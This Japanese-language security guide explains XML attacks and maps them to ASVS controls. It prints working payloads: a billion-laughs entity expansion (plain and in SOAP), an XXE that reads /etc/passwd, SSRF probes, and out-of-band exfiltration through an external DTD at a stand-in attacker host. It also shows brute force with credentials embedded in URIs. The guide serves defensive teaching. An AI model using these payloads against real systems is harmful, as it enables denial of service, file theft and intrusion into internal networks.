**XML パーサが次のコードに含まれる外部エンティティを解決しようとすると、プロセスがクラッシュするまで、アプリケーションは利用可能なメモリをすべて消費し始めます。** これは、攻撃を含む埋め込み [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) スキーマを持つ XML 文書の例です。

```xml
<!DOCTYPE root [
 <!ELEMENT root ANY>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<root>&LOL9;</root>
```text

エンティティ `LOL9` は `LOL8` に定義された 10 個のエンティティとして解決され、その後、それぞれのエンティティが `LOL7` 内で解決される、というように続きます。最終的に、このスキーマで定義された `3 x 10^9` (3,000,000,000) 個のエンティティを解析することで CPU やメモリが影響を受け、パーサがクラッシュする可能性があります。

**Simple Object Access Protocol ([SOAP](https://en.wikipedia.org/wiki/SOAP)) 仕様は [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を完全に禁止しています。これは、SOAP プロセッサが [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を含む任意の SOAP メッセージを拒否できることを意味します。この仕様にもかかわらず、一部の SOAP 実装は SOAP メッセージ内の [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) スキーマを解析していました。**

次の例は、パーサが仕様に従っておらず、SOAP メッセージ内で [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) への参照を有効にしているケースを示しています。

```xml
<?XML VERSION="1.0" ENCODING="UTF-8"?>
<!DOCTYPE SOAP-ENV:ENVELOPE [
 <!ELEMENT SOAP-ENV:ENVELOPE ANY>
 <!ATTLIST SOAP-ENV:ENVELOPE ENTITYREFERENCE CDATA #IMPLIED>
 <!ENTITY LOL "LOL">
 <!ENTITY LOL1 "&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;&LOL;">
 <!ENTITY LOL2 "&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;&LOL1;">
 <!ENTITY LOL3 "&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;&LOL2;">
 <!ENTITY LOL4 "&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;&LOL3;">
 <!ENTITY LOL5 "&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;&LOL4;">
 <!ENTITY LOL6 "&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;&LOL5;">
 <!ENTITY LOL7 "&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;&LOL6;">
 <!ENTITY LOL8 "&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;&LOL7;">
 <!ENTITY LOL9 "&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;&LOL8;">
]>
<SOAP:ENVELOPE ENTITYREFERENCE="&LOL9;"
               XMLNS:SOAP="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/">
 <SOAP:BODY>
  <KEYWORD XMLNS="URN:PARASOFT:WS:STORE">FOO</KEYWORD>
 </SOAP:BODY>
</SOAP:ENVELOPE>
```text

#### 反射型ファイル取得

XXE の次のサンプルコードを考えてください。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
 <!ELEMENT includeme ANY>
 <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<root>&xxe;</root>
```text

**前述の XML は `xxe` という名前のエンティティを定義しており、これは実際には `/etc/passwd` の内容であり、`includeme` タグ内で展開されます。パーサが外部エンティティへの参照を許可している場合、そのファイルの内容が XML レスポンスまたはエラー出力に含まれる可能性があります。**

#### サーバーサイドリクエストフォージェリ

**サーバーサイドリクエストフォージェリ (Server Side Request Forgery: SSRF) は、サーバーが悪意ある XML スキーマを受け取り、それによって HTTP/HTTPS/FTP などを介してファイルなどのリモートリソースを取得させられる場合に発生します。** SSRF は、リモートファイルの取得、ファイルを反射して返せない場合の XXE の証明、ポートスキャン、内部ネットワークへのブルートフォース攻撃に使用されてきました。

##### 外部 DNS 解決

**アプリケーションに任意のドメイン名のサーバーサイド DNS ルックアップを実行させられる場合があります。** これは SSRF の最も単純な形式の一つですが、攻撃者は DNS トラフィックを分析する必要があります。Burp にはこの攻撃をチェックするプラグインがあります。

```xml
<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">
```text

##### 外部接続

XXE があり、ファイルを取得できない場合でも、リモート接続を確立できるかをテストできます。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
```text

##### パラメータエンティティによるファイル取得

パラメータエンティティは、URL 参照を使用してコンテンツを取得できるようにします。次の悪意ある XML 文書を考えてください。

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>
```text

ここで [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) は二つの外部パラメータエンティティを定義しています。`file` はローカルファイルを読み込み、`dtd` はリモート [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) を読み込みます。リモート [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) には、次のような内容が含まれるべきです。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;
```text

二つ目の [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp) により、システムは `file` の内容を URL のパラメータとして攻撃者のサーバーに送り返します。

##### ポートスキャン

ポートスキャンによって生成される情報の量と種類は、実装の種類に依存します。レスポンスは、簡単なものから複雑なものまで、次のように分類できます。

**1) 完全な開示**: これは最も単純で最も珍しいシナリオです。完全な開示では、問い合わせ対象サーバーから完全なレスポンスを受け取ることで、何が起きているかを明確に確認できます。リモートホストへの接続時に何が起こったかを正確に表現できます。

**2) エラーベース**: リモートサーバーからのレスポンスを確認できない場合でも、エラーレスポンスによって生成される情報を使用できる可能性があります。接続を確立しようとしたときに何が問題だったかを SOAP Fault 要素で詳細に漏えいする Web サービスを考えてください。

```text
java.io.IOException: Server returned HTTP response code: 401 for URL: http://192.168.1.1:80
 at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1459)
 at com.sun.org.apache.xerces.internal.impl.XMLEntityManager.setupCurrentEntity(XMLEntityManager.java:674)
```text

**3) タイムアウトベース**: スキャナは、スキーマと基盤実装に応じて、開いているポートまたは閉じているポートに接続するときにタイムアウトを生成する可能性があります。閉じたポートに接続しようとしているときにタイムアウトが発生する場合 (1 分かかることがあります)、有効なポートに接続したときの応答時間は非常に短くなります (たとえば 1 秒)。開いているポートと閉じているポートの違いはかなり明確になります。

**4) 時間ベース**: 結果が非常に微妙であるため、閉じたポートと開いているポートの違いを見分けるのが難しい場合があります。ポートの状態を確実に知る唯一の方法は、各ホストに到達するために必要な時間を複数回測定し、その後、各ポートの平均時間を分析して各ポートの状態を判定することです。この種の攻撃は、高遅延ネットワークで実行される場合、達成が困難になります。

##### ブルートフォース

**攻撃者がポートスキャンを実行できることを確認したら、ブルートフォース攻撃は `username` と `password` を URI スキーム (http、ftp など) の一部として埋め込むだけで実行できます。** たとえば、次の例を参照してください。

```xml
<!DOCTYPE root [
 <!ENTITY user SYSTEM "http://username:password@example.com:8080">
]>
<root>&user;</root>
```

## ASVS との対応

| ASVS 項目 | 関連内容 |
| --- | --- |
| V1.2, V1.5 | XML 文書の構造検証、スキーマ制約、エンティティ展開、SSRF など XML 処理に関連する設計・入力検証上の管理策 |
